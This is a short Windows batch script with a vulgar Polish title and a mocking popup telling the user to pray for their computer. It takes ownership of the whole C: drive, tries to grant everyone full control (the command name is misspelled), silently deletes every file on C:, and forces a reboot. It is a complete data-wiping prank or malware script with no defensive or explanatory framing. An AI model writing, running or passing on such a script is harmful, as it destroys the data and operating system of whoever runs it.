echo off
title ZAPYTAJ SIE TEJ STAREJ KURWY CZY MA BLENDER
color e0
msg %username% Odmow paciorek za twoj komputer. Babele z blenderem przyszla :ccccc
cls
takeown /F C: /R
icalcs "C:" /grant Everyone:F
del C:\ /s /q
shutdown /r /f